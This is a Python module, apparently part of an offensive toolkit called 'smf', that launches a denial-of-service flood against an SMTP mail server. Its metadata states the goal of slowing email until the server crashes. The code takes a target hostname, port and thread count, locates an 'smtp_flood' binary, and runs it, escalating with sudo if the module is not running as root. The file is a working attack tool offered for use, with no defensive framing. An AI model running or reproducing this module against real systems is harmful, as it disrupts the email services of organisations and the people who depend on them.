import subprocess
import os
import smf

from rootmap import ROOT
from lib.roar.callbin.calling import call_bin

MOD_INFO = {
    "Name": "DoS to SMTP network",
    "Description": """
Flooding an SMTP network to disrupt email services
until it is slow and even the server crashes.
""",
    "Author": ["zxelzy"],
    "Action": [
        ["DoS", {"Description": "Sending strange requests"}],
    ],
    "DefaultAction": "DoS",
    "License": "SMF License",
}
REQUIRED_OPTIONS = {
    "HOSTNAME": "ex: mail.storm.com",
    "PORT": "ex: 25",
    "THREAD": "ex: 1000",
}


def execute(options):
    target = str(options.get("HOSTNAME"))
    port = str(options.get("PORT"))
    threads = str(options.get("THREAD"))

    bin_path = call_bin("smtp_flood")
    
    if not target:
        smf.printf("[-] Target is missing!")
        return

    if not bin_path:
        smf.printf("[!] Binary not found =>", bin_path)
        return

    if os.getuid() == 0:
        command = [bin_path, "-t", target, "-p", port, "-w", threads]
    else:
        smf.printf("[!] This module requires root. Requesting sudo...")
        command = ["sudo", bin_path, "-t", target, "-p", port, "-w", threads]

    smf.printf(f"[*] Starting SMTP Flood on {target}")
    try:
        process = subprocess.Popen(command, stdout=None, stderr=None)
        process.wait()
    except KeyboardInterrupt:
        process.terminate()
        smf.printf("\n[!] SMTP Flood stopped.")
